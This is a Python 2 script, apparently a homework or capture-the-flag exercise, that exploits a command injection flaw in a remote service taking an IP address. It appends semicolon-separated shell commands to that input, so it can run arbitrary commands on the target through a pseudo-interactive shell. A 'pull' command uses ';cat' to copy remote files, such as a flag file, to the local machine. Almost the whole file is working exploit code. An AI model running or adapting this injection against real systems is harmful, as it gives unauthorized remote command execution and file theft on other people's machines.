"""
    Use the same techniques such as (but not limited to):
        1) Sockets
        2) File I/O
        3) raw_input()

    from the OSINT HW to complete this assignment. Good luck!
"""
import time
import socket
import sys

host = "cornerstoneairlines.co" # IP address here
port = 45 # Port here

def execute_cmd(cmd):
    help_menu = '''----------HELP MENU----------\n 1. shell --> Drop into an interactive shell and allow users to gracefully exit\n 2. pull <remote-path> <local-path> --> Download files\n 3. help --> shows this help menu\n 4. quit --> Quit the shell\n'''
    pwd = "/"
    
    split_cmd = cmd.split(" ")
    cmd = split_cmd[0]
    if cmd == "shell":
        print (pwd + "> "),
        inputt = raw_input()

        while inputt != "quit":
            # return to last working directory
            last_pwd = "; cd " + pwd + " && " 
            data = ""

            if "cd " in inputt:
                out = last_pwd + inputt + " && echo $PWD\n"
                pwd = send_cmd(out)
            else:
                out = last_pwd + inputt + '\n'
                data = send_cmd(out)
            
            print data # cmd output
            print (pwd + "> "),
            inputt = raw_input()
    if cmd == "pull":
        data = send_cmd(";cat " + split_cmd[1] + '\n')
        f = open(split_cmd[2], "w+")
        f.write(data)
        f.close()
    if cmd == "help":
        print (help_menu)
    else:
        print("Invalid input. Use the help menu to see valid inputs.\n")

def send_cmd(cmd):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host,port))
    data = b''
   
    # receive all banner info first
    while "Enter IP address:" not in data.decode('ascii'):
        data += s.recv(1024)
    
    s.send(cmd.encode('utf-8'))
    data = s.recv(1024) # cmd output
    return data.decode('ascii').strip()

if __name__ == '__main__':
    #execute_cmd("shell")
    #execute_cmd("pull /home/flag.txt /myflag.txt") 
    #execute_cmd("help")
    #execute_cmd("lauren")
